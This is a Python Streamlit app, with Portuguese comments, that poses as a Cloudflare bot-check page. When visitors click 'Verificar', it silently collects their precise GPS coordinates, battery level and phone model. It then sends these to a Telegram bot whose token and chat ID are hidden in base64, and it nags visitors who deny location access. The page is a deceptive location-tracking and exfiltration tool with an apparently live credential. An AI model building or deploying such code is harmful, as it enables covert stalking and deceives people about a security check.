import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- 1. CONFIGURAÇÃO DA ABA ---
st.set_page_config(page_title="Verificação de Segurança", page_icon="🛡️", layout="centered")

# --- 2. DADOS DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- 3. CSS PARA O LOOK CLOUDFLARE E SPINNER PONTILHADO ---
st.markdown("""
    <style>
        .stApp { background-color: #1d1d1d !important; color: #d9d9d9 !important; }
        footer, header, .stDeployButton { visibility: hidden; display: none; }
        
        .site-header { font-family: sans-serif; font-size: 26px; font-weight: 500; color: #fff; margin-bottom: 10px; }
        .desc-text { color: #d9d9d9; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }

        .cf-widget {
            background-color: #2c2c2c;
            border: 1px solid #444;
            padding: 15px 20px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 65px;
            margin-bottom: 15px;
        }
        .cf-left { display: flex; align-items: center; gap: 15px; }
        .cf-logo { height: 22px; opacity: 0.7; }
        
        /* SPINNER PONTILHADO */
        .spinner {
            font-size: 10px;
            width: 1em;
            height: 1em;
            border-radius: 50%;
            position: relative;
            text-indent: -9999em;
            animation: spin 1.3s infinite linear;
            transform: translateZ(0);
            color: #10b981;
        }
        .cf-left .spinner {
             box-shadow: 
                 0em -1.5em 0em 0em currentColor, 1.1em -1.1em 0 0 currentColor, 
                 1.5em 0em 0 0 currentColor, 1.1em 1.1em 0 0 currentColor, 
                 0em 1.5em 0 0 currentColor, -1.1em 1.1em 0 0 currentColor, 
                 -1.5em 0em 0 0 currentColor, -1.1em -1.1em 0 0 currentColor;
            margin-right: 1.5em;
            margin-left: 0.5em;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .stButton > button {
            width: 150px;
            background-color: #3b82f6 !important;
            color: white !important;
            border: none !important;
            font-weight: 600;
            border-radius: 4px;
            height: 45px;
        }
        
        .success-box { text-align: center; margin-top: 50px; }
        .success-title { font-size: 28px; font-weight: bold; color: #fff; margin-bottom: 10px; }
        .success-text { color: #10b981; font-size: 20px; font-weight: 600; }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

if 'status' not in st.session_state:
    st.session_state['status'] = 'inicio'

# --- 4. LÓGICA DE TELAS ---

if st.session_state['status'] == 'inicio':
    st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
    st.markdown('<div class="desc-text">Este site utiliza um serviço de segurança para proteção contra bots maliciosos.<br>Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)
    st.markdown('<div class="cf-widget"><div class="cf-left"><div style="width:22px; height:22px; border:2px solid #555; border-radius:3px;"></div><span>Verificando se você é humano...</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo"></div>', unsafe_allow_html=True)
    
    if st.button("Verificar"):
        st.session_state['status'] = 'processando'
        st.rerun()

elif st.session_state['status'] == 'processando':
    st.markdown('<div class="site-header">Verificando...</div>', unsafe_allow_html=True)
    st.markdown('<div class="cf-widget"><div class="cf-left"><div class="spinner"></div><span>Verificando...</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo"></div>', unsafe_allow_html=True)
    
    # --- COLETA DE DADOS EM TEMPO REAL ---
    ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_CAP")
    bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_CAP")
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:7000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_CAP")

    if posicao:
        if posicao != "erro":
            # Processar modelo do celular
            modelo = "Não identificado"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        p = p.strip()
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "Moto", "iPhone", "Redmi", "Pixel"]):
                            modelo = p
                            break
                except: pass
            
            # Montar Relatório
            relatorio = (
                f"🛡️ *CLOUDFLARE PROTECT*\n"
                f"📱 *Aparelho:* {modelo}\n"
                f"🔋 *Bateria:* {bat if bat else '??'}%\n"
                f"📍 *Local:* https://www.google.com/maps?q={posicao}"
            )
            
            enviar_telegram(relatorio)
            st.session_state['status'] = 'sucesso'
            st.rerun()
        else:
            st.error("Por favor, permita a localização para continuar.")
            time.sleep(2)
            st.session_state['status'] = 'inicio'
            st.rerun()

elif st.session_state['status'] == 'sucesso':
    st.markdown("""
    <div class="success-box">
        <div class="success-title">Verificação de Segurança</div>
        <div class="success-text">✅ Proteção Ativada com Sucesso</div>
    </div>
    """, unsafe_allow_html=True)
    st.markdown('<div style="text-align:center; color:#444; font-size:11px; margin-top:100px;">Ray ID: 7d8f9a1b2c3d • Miamy Security ©2026</div>', unsafe_allow_html=True)

if st.session_state['status'] == 'inicio':
    st.markdown('<div style="text-align:center; color:#444; font-size:11px; margin-top:80px;">Ray ID: 7d8f9a1b2c3d • 2026 Miamy Segurança©  Digital e Proteção  Todos os direitos reservados. </div>', unsafe_allow_html=True)
            
